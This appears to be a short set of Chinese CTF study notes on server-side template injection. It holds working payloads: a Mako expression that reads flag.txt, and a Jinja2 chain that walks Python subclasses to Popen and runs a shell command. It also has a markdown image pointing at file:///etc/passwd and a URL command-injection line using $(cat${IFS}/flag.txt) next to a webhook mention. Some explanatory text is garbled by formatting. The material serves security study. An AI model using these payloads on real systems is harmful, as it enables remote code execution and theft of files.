mako 模版注入 ${7*7}   payload: %24{open('..%2Fflag.txt').read()}

jinjia2 模版注入

**列出所有 Python 类**

{{''.**class**.**mro**[1].**subclasses**()}}

- `''.__class__str`
    
    访问字符串类（
    
    ）
    
- `.__mro__[1]object`
    
    检索超类（
    
    ）
    
- `.__subclasses__()object`
    
    返回从继承的所有类
    

**查找`Popen`类别索引**

{% for c in ''.__class__.__mro__[1].__subclasses__() %}

{% if 'Popen' in c.__name__ %}

{{ loop.index0 }} - {{ c }}

{% endif %}

{% endfor %}

这将循环遍历所有子类，并打印包含 的类的索引`Popen`。我在索引 处找到了它`359`。

{{''.**class**.**mro**[1].**subclasses**()[359]('id', shell=True, stdout=-1).communicate()[0].decode()}}

- `stdout=-1`
    
    捕获输出
    
- `.communicate()[0]`
    
    获取字节响应
    
- `.decode()`
    
    将字节转换为可读的字符串
    

`![alt text](URL)`

- `alt text`
    
    ：这是图像加载失败时显示的文本。
    

![alt text](file:///etc/passwd)

webhook

url?x=$(cat${IFS}/flag.txt)
